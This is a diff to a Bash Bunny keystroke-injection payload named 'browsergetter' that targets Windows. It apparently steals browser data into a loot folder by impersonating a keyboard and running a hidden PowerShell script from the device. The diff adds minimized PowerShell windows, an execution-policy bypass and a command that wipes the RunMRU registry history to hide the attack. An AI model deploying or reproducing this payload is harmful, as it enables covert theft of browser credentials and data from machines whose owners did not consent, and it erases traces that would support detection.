@@ -2,7 +2,7 @@
 #
 # Title:         browsergetter
 # Author:        greenwe333
-# Version:       1.0
+# Version:       1.1
 # Target:        Windows
 # 
 # Runs powershell as Administrator
@@ -18,10 +18,17 @@ LED R 100
 mkdir -p /root/udisk/loot/BrowserGetter
 
 
-LED R
+LED B
 ATTACKMODE HID STORAGE
 QUACK GUI r
 QUACK DELAY 100
-QUACK STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\a.cmd')"
+QUACK STRING powershell -windowStyle minimized ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\$SWITCH_POSITION\a.cmd')"
 QUACK ENTER
-LED G
+
+QUACK DELAY 500
+QUACK GUI r
+QUACK DELAY 500
+QUACK STRING powershell -windowStyle minimized -Exec Bypass "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+QUACK ENTER
+
+LED G 200
